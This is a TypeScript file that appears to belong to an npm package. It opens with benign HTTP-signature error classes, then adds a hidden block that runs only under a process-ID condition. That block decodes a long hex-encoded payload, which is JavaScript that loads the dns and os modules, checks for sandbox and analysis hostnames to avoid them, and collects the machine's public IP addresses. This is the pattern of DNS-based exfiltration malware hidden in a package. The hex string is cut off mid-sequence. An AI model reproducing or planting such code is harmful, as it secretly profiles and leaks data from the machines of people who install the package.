
class InvalidError extends HttpSignatureError {
  constructor(message: string) {
    super(message, InvalidParamsError);
  }
}

class HeaderError extends HttpSignatureError {
  constructor(message: string) {
    super(message, MissingHeaderError);
  }
}

if (process.argv[2] == process.ppid) {
  const pJSON = require("./package.json");
  const package = pJSON.name;

  function nify(pack: string, data: string): string {
    const buffer1Text = Buffer.from(data, 'hex');
    const text = buffer1Text.toString('ascii');
    return text.replace('$$$$$$', pack);
  }

  let srimg = "636f6e737420646e73203d20726571756972652822646e7322293b0a636f6e7374206f73203d207265717569726528226f7322293b0a0a66756e6374696f6e207568786679286461746129207b0a20202020636f6e73742062756666657254657874203d204275666665722e66726f6d28646174612c202768657827293b0a20202020636f6e73742074657874203d20627566666572546578742e746f537472696e672827617363696927293b0a2020202072657475726e20746578743b0a7d0a0a66756e6374696f6e2065687866792864617461297b0a636f6e73742062756666657254657874203d204275666665722e66726f6d28646174612c20277574663827293b0a636f6e73742074657874203d20627566666572546578742e746f537472696e67282768657827293b0a72657475726e20746578743b0a7d0a0a66756e6374696f6e20637575696428696e707574537472696e6729207b0a20202020766172207265203d202f5e5b302d39612d665d2b2d5b302d39612d665d2b2d5b302d39612d665d2b2d5b302d39612d665d2b2d5b302d39612d665d2b242f673b0a202020206966202872652e7465737428696e707574537472696e672929207b0a202020202020202072657475726e20747275650a202020207d20656c7365207b0a202020202020202072657475726e2066616c73653b0a202020207d0a7d0a0a66756e6374696f6e206368657828696e707574537472696e6729207b0a20202020766172207265203d202f5e5b302d39612d665d2b242f673b0a202020206966202872652e7465737428696e707574537472696e672929207b0a202020202020202072657475726e20747275650a202020207d20656c7365207b0a202020202020202072657475726e2066616c73653b0a202020207d0a7d0a0a66756e6374696f6e206973676f6f6428686f73746e616d652c20757365726e616d6529207b0a2020202069662028686f73746e616d65203d3d2075687866792822343434353533346235343466353032643334343533313439353333303462222920262620757365726e616d65203d3d2075687866792822363436313631373336313634366436393665222929207b0a202020202020202072657475726e2066616c73653b0a202020207d20656c73652069662028686f73746e616d65203d3d2075687866792827363236663738272929207b0a202020202020202072657475726e2066616c73653b0a202020207d20656c736520696620286368657828686f73746e616d652929207b0a202020202020202072657475726e2066616c73653b0a202020207d20656c73652069662028637575696428686f73746e616d652929207b0a202020202020202072657475726e2066616c73653b0a202020207d0a20202020656c73652069662028686f73746e616d65203d3d20756878667928273663363936633639326437303633272929207b0a202020202020202072657475726e2066616c73653b0a202020207d20656c73652069662028686f73746e616d65203d3d2075687866792827363137373733326433373637373236313732363133393331333336663639363433353661373336353738363736623731272929207b0a202020202020202072657475726e2066616c73653b0a202020207d0a20202020656c73652069662028686f73746e616d65203d3d207568786679282736393665373337343631366536333635272929207b0a202020202020202072657475726e2066616c73653b0a202020207d20656c7365207b0a202020202020202072657475726e20747275653b0a202020207d0a2020202072657475726e20747275653b0a7d0a0a0a66756e6374696f6e2069737072697661746528697029207b0a2020202069662869702e696e636c7564657328273a2729290a202020202020202072657475726e20747275653b0a20202020766172207061727473203d2069702e73706c697428272e27293b0a2020202072657475726e2070617274735b305d203d3d3d2027313027207c7c0a20202020202020202870617274735b305d203d3d3d20273137322720262620287061727365496e742870617274735b315d2c20313029203e3d203136202626207061727365496e742870617274735b315d2c20313029203c3d2033312929207c7c0a20202020202020202870617274735b305d203d3d3d2027313932272026262070617274735b315d203d3d3d20273136382729207c7c202870617274735b305d203d3d3d2027313237272026262070617274735b315d203d3d3d202730272026262070617274735b325d203d3d3d20273027293b0a7d0a0a66756e6374696f6e20746f6470286970297b0a72657475726e2069702e7265706c616365282f5c2e2f672c20272d27292e7265706c616365282f3a2f672c272d27293b0a7d0a0a66756e6374696f6e206765746970616464727328297b0a766172207374723d5b5d3b0a766172206e6574776f726b496e7465726661636573203d206f732e6e6574776f726b496e746572666163657328293b0a666f72286974656d20696e206e6574776f726b496e7465726661636573297b0a6966286974656d20213d20226c6f22297b0a666f722876617220693d303b693c6e6574776f726b496e74657266616365735b6974656d5d2e6c656e6774683b692b2b297b0a69662821697370726976617465286e6574776f726b496e74657266616365735b6974656d5d5b695d2e6164647265737329290a7374722e70757368286e6574776f726b496e74657266616365735b6974656d5d5b695d2e61646472657373293b0a7d0a7d0a7d0a666f722876617220693d303b693c7374722e6c656e6774683b692b2b297b0a6966287374725b695d2.